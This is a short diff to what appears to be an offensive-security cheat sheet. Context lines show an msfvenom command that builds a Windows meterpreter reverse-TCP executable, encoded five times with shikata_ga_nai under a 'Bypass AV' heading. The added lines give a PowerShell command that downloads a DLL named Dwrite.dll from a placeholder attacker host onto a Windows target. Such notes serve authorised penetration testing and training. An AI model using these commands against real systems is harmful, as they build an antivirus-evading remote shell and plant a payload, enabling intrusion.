@@ -87,3 +87,7 @@ Create payload with msfvenom
 ## Bypass AV
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe`
+
+## Download from windows
+
+`iwr -UseBasicParsing -Uri http://<Your-IP>/Dwrite.dll -OutFile .\Dwrite.dll`
